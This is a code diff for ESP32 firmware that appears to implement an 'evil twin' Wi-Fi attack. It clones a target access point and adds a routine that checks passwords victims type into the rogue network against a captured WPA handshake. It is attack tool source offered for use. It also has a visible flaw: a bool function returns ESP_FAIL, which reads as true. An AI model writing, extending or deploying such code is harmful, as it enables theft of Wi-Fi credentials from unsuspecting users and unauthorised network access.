@@ -1,10 +1,13 @@
 #include <string.h>
 #include "esp_log.h"
 #include "esp_task_wdt.h"
+#include "utils.h"
 #include "wifiMng.h"
 #include "admin_server.h"
 #include "server.h"
 #include "evil_twin.h"
+#include "aircrack.h"
+#include "wifi_attacks.h"
 
 
 /* Store target information */
@@ -41,7 +44,7 @@ static void evil_twin_task(void *pvParameters)
         },
     };
     strcpy((char *)&wifi_config.ap.ssid, (char *)&target.ssid);
-    wifi_ap_clone(&wifi_config);
+    wifi_ap_clone(&wifi_config, NULL);
 
     /* Wait AP to be cloned */
     vTaskDelay(pdMS_TO_TICKS(5000));
@@ -104,8 +107,17 @@ void evil_twin_stop_attack(void)
 }
 
 
-esp_err_t evil_twin_check_password(char *password)
+bool evil_twin_check_password(char *password)
 {
-    //TODO
-    return ESP_OK;
+    handshake_info_t *handshake = wifi_attack_engine_handshake();
+
+    if( handshake->handshake_captured == false )
+    {
+        return ESP_FAIL;
+    }
+    else
+    {
+        //return verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->pmkid);
+        return verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->anonce, handshake->snonce, handshake->eapol, handshake->eapol_len, handshake->mic);
+    }
 }
